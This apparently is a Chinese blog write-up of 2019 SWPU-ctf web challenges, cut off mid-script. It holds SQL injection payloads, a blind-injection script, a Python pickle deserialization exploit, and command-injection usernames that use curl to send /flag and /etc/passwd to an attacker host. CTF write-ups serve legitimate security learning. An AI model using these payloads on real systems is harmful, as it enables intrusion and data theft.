<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ctf"><meta name="keywords" content="SWPU ctf"><meta name="author" content="Somnus"><meta name="copyright" content="Somnus"><title>2019 SWPU-ctf Web部分题解WriteUp | Somnus's blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-web"><span class="toc-number">1.</span> <span class="toc-text">easy_web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python简单题"><span class="toc-number">2.</span> <span class="toc-text">python简单题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-python"><span class="toc-number">3.</span> <span class="toc-text">easy_python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#demo-mvc"><span class="toc-number">4.</span> <span class="toc-text">demo_mvc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FFFFF"><span class="toc-number">5.</span> <span class="toc-text">FFFFF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#出题人不知道"><span class="toc-number">6.</span> <span class="toc-text">出题人不知道</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Somnus</div><div class="author-info__description text-center">与其哀叹，不如埋头苦干</div><div class="follow-button"><a href="https://Nikoeurus.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">96</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">44</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">26</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">七月火</a><a class="author-info-links__name text-center" href="https://zhzhdoai.github.io" target="_blank" rel="noopener">osword</a><a class="author-info-links__name text-center" href="https://glotozz.github.io/" target="_blank" rel="noopener">glotozz</a><a class="author-info-links__name text-center" href="http://dkk.ink" target="_blank" rel="noopener">dkk</a><a class="author-info-links__name text-center" href="https://www.virtua1.cn/" target="_blank" rel="noopener">Virtua1</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/background.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Somnus's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">2019 SWPU-ctf Web部分题解WriteUp</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-12-09</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/">ctf</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>2019 SWPU-ctf Web部分题解WriteUp<a id="more"></a></p>
<h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h3><p>随便注册个账号登陆后，测试发现留言处的<strong>title</strong>字段存在<strong>二次注入</strong></p>
<p><img src="../../../../img/swpuctf/1.png" alt=""></p>
<p>有报错和回显，但是报错过滤了<strong>extractvalue</strong>和<strong>updatexml</strong></p>
<p>于是考虑用union联合注入</p>
<p>这里坑点在于过滤了<strong>or</strong>关键字，然后字段有20多个</p>
<p>过滤了<code>or</code>和<code>mysql</code>关键字，所以用<code>sys.schema_auto_increment_columns</code>来注表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=ad&apos;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22&amp;content=1&amp;ac=add</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/swpuctf/2.png" alt=""></p>
<p>表名<code>ads,users</code></p>
<p>但是不知道列名，只能用无列名注入的方式，另外还过滤了反引号`，用别名<strong>a.2</strong>来代替，payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=ad&apos;/**/union/**/select/**/1,(select/**/a.2/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,1,&apos;1&amp;content=1&amp;ac=add</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/swpuctf/3.png" alt=""></p>
<p>第二列内容为<code>flag</code>，那么看看第三列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=ad&apos;/**/union/**/select/**/1,(select/**/a.3/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,1,&apos;1&amp;content=1&amp;ac=add</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/swpuctf/4.png" alt=""></p>
<p>得到一串md5，解密就是flag</p>
<p><img src="../../../../img/swpuctf/5.png" alt=""></p>
<h3 id="python简单题"><a href="#python简单题" class="headerlink" title="python简单题"></a>python简单题</h3><p>注册登陆后，源码提示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--没错就是这么简洁~Red*s--&gt;</span><br></pre></td></tr></table></figure>

<p>存在redis服务，并且标题为：<strong>Deserialization</strong></p>
<p>暗示了反序列化，搜索python redis 反序列化</p>
<p><a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a> </p>
<p>session存储的是利用python的序列化字符串存在<strong>redis</strong>里的，故当我们携带session访问时，就会反序列化读到我们的信息 </p>
<p>所以我们可以通过python pickle反序列化攻击session</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""curl vps:8887"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line"><span class="keyword">print</span> s.replace(<span class="string">"\n"</span>,<span class="string">'\\n'</span>).replace(<span class="string">"\""</span>,<span class="string">"\\\""</span>)</span><br></pre></td></tr></table></figure>

<p>linux环境下python2运行得到序列化字符串payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cposix\nsystem\np1\n(S&apos;curl vps:8887&apos;\np2\ntRp3\n.</span><br></pre></td></tr></table></figure>

<p>因为session是存储在redis的，而且所以session存储的key就是session:加上cookie中的session值（点之前） </p>
<p>我们先通过<code>redis-cli</code>来连接redis服务器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ redis-cli -h 114.67.109.247 -p 6379</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/swpuctf/6.png" alt=""></p>
<p>但是查看session时提示需要认证密码</p>
<p>这里需要弱密码爆破一下，发现是<strong>password</strong></p>
<p><img src="../../../../img/swpuctf/7.png" alt=""></p>
<p>找到我们登陆用户的session对应的key</p>
<p><img src="../../../../img/swpuctf/8.png" alt=""></p>
<p><strong>点号之前</strong>，所以是<strong>a1b3f737-69bf-4460-8374-81f7969af430</strong></p>
<p>在redis-cli中验证一下</p>
<p><img src="../../../../img/swpuctf/9.png" alt=""></p>
<p>对应上了我们登陆的用户名</p>
<p>OK，那么开始修改这个key为我们刚才注入的序列化payload：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">114.67.109.247:6379&gt; <span class="built_in">set</span> <span class="string">"session:a1b3f737-69bf-4460-8374-81f7969af430"</span> <span class="string">"cposix\nsystem\np1\n(S'curl vps:8887'\np2\ntRp3\n."</span></span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/swpuctf/10.png" alt=""></p>
<p>然后再次访问这个cookie</p>
<p><img src="../../../../img/swpuctf/11.png" alt=""></p>
<p>成功反序列化执行命令，最后就是把执行的命令替换成题目说明的：<code>curl -d &quot;@/flag&quot; your-ip</code>即可</p>
<p><img src="../../../../img/swpuctf/12.png" alt=""></p>
<p>最后附上总的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""curl -d "@/flag" vps:8887"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line"></span><br><span class="line">r = redis.Redis(host=<span class="string">'114.67.109.247'</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>,password=<span class="string">"password"</span>)</span><br><span class="line">r.set(<span class="string">"session:c6835089-814e-4b03-aef8-7c41165ee98a"</span>, s)</span><br></pre></td></tr></table></figure>

<h3 id="easy-python"><a href="#easy-python" class="headerlink" title="easy_python"></a>easy_python</h3><p>有个登陆界面，随便输个用户名都能登陆，回显用户名</p>
<p><img src="../../../../img/swpuctf/13.png" alt=""></p>
<p>然后进入/upload路由，提示没有权限</p>
<p>因为有回显用户名，所以一开始测ssti，但是发现不存在</p>
<p>然后发现源码有段注释：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">404 not found</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>随便访问个404，然后抓包发现响应包头部：</p>
<p><img src="../../../../img/swpuctf/14.png" alt=""></p>
<p>base64解码得到<strong>secret_key</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</span><br></pre></td></tr></table></figure>

<p>有了secert_key，就能伪造任意session了</p>
<p>首先解密session：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.XekLoQ.SbTTt8ISvhNT8GMDjRGK1F2sHF8"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rs = session_cookie_manager.FSCM.decode(s, <span class="string">"keyqqqwwweee!@#$%^&amp;*"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rs</span><br><span class="line">&#123;<span class="string">u'username'</span>: <span class="string">u'admin'</span>, <span class="string">u'password'</span>: <span class="string">u'1'</span>, <span class="string">u'id'</span>: <span class="string">'100'</span>, <span class="string">u'is_login'</span>: <span class="literal">True</span>&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>尝试修改id为1：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>rs[<span class="string">u'id'</span>]=<span class="string">'1'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session_cookie_manager.FSCM.encode(SECRET_KEY, str(rs))</span><br><span class="line"><span class="string">'eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.XekMig.svugWwZrG31P4_vp8YhmyjCV4nI'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>把得到的session替换，进入<strong>/upload</strong></p>
<p>得到源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/upload',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'id'</span>] != <span class="string">b'1'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">'POST'</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">'password'</span>]</span><br><span class="line">        name = name+<span class="string">'qweqweqwe'</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">'file'</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">        path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"zip"</span> != filename.split(<span class="string">'.'</span>)[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'zip only allowed'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">';'</span>) != <span class="number">-1</span>:</span><br><span class="line">				waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">'r'</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">'is_login'</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'not login'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">'/'</span>) != <span class="number">-1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            image = open(path+unzip_filename, <span class="string">"rb"</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/showflag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = open(os.path.join(<span class="string">'./flag/flag.jpg'</span>), <span class="string">"rb"</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"can't give you"</span></span><br></pre></td></tr></table></figure>

<p>程序大致流程是，上传zip包，解压缩，然后/showflag中告诉了我们flag的路径：<strong>./flag/flag.jpg</strong></p>
<p>感觉是考软链接，但是看到了一个命令执行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f=request.files[<span class="string">'file'</span>]</span><br><span class="line">path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">filename = f.filename</span><br><span class="line">pathname = path+filename</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">	<span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">';'</span>) != <span class="number">-1</span>:</span><br><span class="line">		waf()</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">	os.system(cmd)</span><br></pre></td></tr></table></figure>

<p><code>filename</code>和<code>session[&#39;username&#39;]</code>我们都是可控的，然后参数之间拼接到命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;unzip -n -d &quot;+path+&quot; &quot;+ pathname</span><br></pre></td></tr></table></figure>

<p>只是过滤了<code>|</code>和<code>;</code>，但是<code>&amp;</code>和<code>#</code>都没有过滤掉，所以可以构造任意命令执行</p>
<p>可控的两个参数中，<code>filename</code>因为是文件名，不能带有<code>/</code>，所以不好注入</p>
<p>于是就把注入点放在<code>session[&#39;username&#39;]</code></p>
<p>注册用户名：<code>&amp; curl vps:8888 #</code>，得到session后，同样按上面的方法一样修改<code>id:1</code>然后访问<code>/upload</code></p>
<p><img src="../../../../img/swpuctf/15.png" alt=""></p>
<p><img src="../../../../img/swpuctf/16.png" alt=""></p>
<p>成功执行curl</p>
<p>那么尝试外带flag文件，注册：<code>&amp; curl vps:8888 -d &quot;@/etc/passwd&quot; #</code></p>
<p><img src="../../../../img/swpuctf/17.png" alt=""></p>
<p>注册：<code>&amp; curl vps:8888 -d &quot;@./flag/flag.jpg&quot; #</code></p>
<p><img src="../../../../img/swpuctf/18.png" alt=""></p>
<p>果然，是一个jpg文件，光看内容没有看到flag，估计得把图片显示出来</p>
<p>一开始是想直接弹shell，但是发现能接收，但是没有弹出命令行，很迷</p>
<p>最后想了很久，只能分两步：</p>
<p>第一步把flag.jpg得内容进行base64加密，写到服务器的<strong>/tmp/1.txt</strong>下</p>
<p>第二步再通过curl把<strong>/tmp/1.txt</strong>内容读出来</p>
<p>首先注册：<code>&amp; base64 ./flag/flag.jpg &gt; /tmp/1.txt #</code></p>
<p>触发执行后，再注册：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; curl vps:8888 -d &quot;@/tmp/1.txt&quot; #</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/swpuctf/19.png" alt=""></p>
<p>接收后进行解码，保存到本地的jpg：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat 1.txt | base64 -d &gt; flag.jpg</span><br></pre></td></tr></table></figure>

<p>flag就在图片中</p>
<p><img src="../../../../img/swpuctf/20.png" alt=""></p>
<p>预期解是软链接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/self/cwd/flag/flag.jpg somnus</span><br><span class="line">zip -ry somnus.zip somnus</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/swpuctf/60.png" alt=""></p>
<h3 id="demo-mvc"><a href="#demo-mvc" class="headerlink" title="demo_mvc"></a>demo_mvc</h3><p>打开靶机，有个登陆界面，提交和返回的都是json格式数据</p>
<p><img src="../../../../img/swpuctf/21.png" alt=""></p>
<p>修改用户名为：<code>admin&#39;</code></p>
<p>服务器出现了报错</p>
<p><img src="../../../../img/swpuctf/22.png" alt=""></p>
<p>加上<code>#</code>注释，报错消失，但是后面测试又发现：<code>admin&#39;||sleep(3)#</code>没有被执行</p>
<p>后面测试发现：存在过滤的关键字，同样会返回202。成功执行，有语法错误，则返回500</p>
<p>测试得到以后过滤关键字：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml extractvalue or and if ascii sleep substr , || &amp;&amp;</span><br></pre></td></tr></table></figure>

<p>利用语法错误<code>abs(-9223372036854775808)</code>，进行盲注，注释符可以用<code>-- -</code>来替代，<code>case when then else end</code>来代替<code>if</code>，截取字符串的话，用<code>mid</code>来代替<code>substr</code>，然后过滤了逗号和<code>or</code>用<code>from</code>来代替</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(case hex(mid(database() from -1)) when 65 then 1 else abs(-9223372036854775808) end)-- -</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://182.92.220.157:11116/index.php?r=Login/Login"</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line">hex_database = <span class="string">""</span></span><br><span class="line">i = <span class="number">-1</span></span><br><span class="line"><span class="keyword">while</span> i &gt; <span class="number">-10</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">44</span>,<span class="number">128</span>):</span><br><span class="line">        j = chr(j)</span><br><span class="line">        k = j.encode(<span class="string">'hex'</span>)</span><br><span class="line">        username = <span class="string">"'^(case/**/hex(mid(database()/**/from/**/"</span>+str(i)+<span class="string">"))/**/when/**/"</span>+k+hex_database+<span class="string">"/**/then/**/1/**/else/**/abs(-9223372036854775808)/**/end)-- -"</span></span><br><span class="line">        <span class="comment">#username = "'^(case hex(mid(database() from -1)) when 65  then 1 else abs(-9223372036854775808) end)-- -"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"username"</span>:username,</span><br><span class="line">            <span class="string">"password"</span>:<span class="string">"1"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print username</span></span><br><span class="line">        data = json.dumps(data)</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#print r.text</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"202"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            database = j + database</span><br><span class="line">            hex_database = k + hex_database</span><br><span class="line">            <span class="keyword">print</span> database</span><br><span class="line">            